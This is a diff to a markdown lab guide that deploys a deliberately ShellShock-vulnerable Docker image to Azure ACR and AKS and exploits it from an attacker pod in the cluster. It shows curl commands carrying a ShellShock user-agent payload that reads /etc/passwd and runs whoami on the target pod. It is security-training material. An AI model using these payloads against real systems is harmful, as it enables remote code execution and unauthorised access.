@@ -1,5 +1,7 @@
 # In this lab we will use a ShellShock vulnerable docker image from the Docker Hub, store it in the Azure ACR and from there deploy to Azure AKS
 
+We will exploit Shell-Shock vulnerabilities to execute RCE from an attaker por running in the same cluster
+
 Login to your Azure ACR registry where you will push the vulnerable image
 
 ```
@@ -97,7 +99,7 @@ curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http
 and
 ```
 curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'whoami'" http://[ip-address-shell-shock-pod]/cgi-bin/vulnerable
-
+```
 
 
 
